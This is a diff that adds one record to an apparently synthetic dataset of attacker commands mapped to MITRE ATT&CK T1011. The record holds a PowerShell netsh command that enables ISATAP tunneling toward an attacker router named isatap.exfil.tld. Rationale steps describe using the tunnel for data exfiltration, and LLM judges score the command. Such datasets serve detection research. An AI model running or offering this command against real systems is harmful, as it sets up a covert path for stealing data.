@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh interface isatap set state state=enabled; netsh interface isatap set router isatap.exfil.tld",
+  "explanation": "Activates ISATAP and points it to a custom router, enabling IPv6-in-IPv4 tunneling as an alternate medium suitable for exfiltration (T1011).",
+  "rationale_steps": [
+    "Enable ISATAP to encapsulate IPv6 over IPv4, creating a distinct communication path.",
+    "Direct the tunnel to an attacker-controlled ISATAP router.",
+    "Use the tunnel to transfer data over IPv6 where monitoring may be weaker."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-7845b056",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Two well-formed netsh commands separated by a valid PowerShell semicolon with parameters consistent with netsh isatap syntax.",
+        "semantic_score": 3,
+        "semantic_justification": "On supported Windows and with admin rights this enables ISATAP and sets a router (setup step only), but it neither performs exfiltration itself, requires elevation despite 'Privilege: None', and its use of IPv6-in-IPv4 is not clearly an 'other network medium' per T1011.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T01:21:37.637040Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "Both netsh commands are well-formed with valid subcommands, parameters, and values, properly separated by a semicolon for sequential execution in PowerShell.",
+        "semantic_score": 4,
+        "semantic_justification": "The commands correctly enable ISATAP and configure a custom router to establish IPv6-in-IPv4 tunneling, which is a plausible alternate network medium for exfiltration aligned with T1011, though ISATAP is deprecated in modern Windows versions (Windows 10+) reducing operational feasibility, and the privilege claim of 'None' is inaccurate as netsh interface modifications typically require administrator privileges.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2026-02-18T22:08:53.438903Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The commands use standard netsh syntax with a valid PowerShell separator and no formatting errors.",
+        "semantic_score": 3,
+        "semantic_justification": "While the commands establish an ISATAP tunnel, this operation requires administrative privileges—not 'None' as stated—and ISATAP is typically classified as protocol tunneling rather than a separate physical network medium.",
+        "combined_score": 4.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:08:56.016432Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
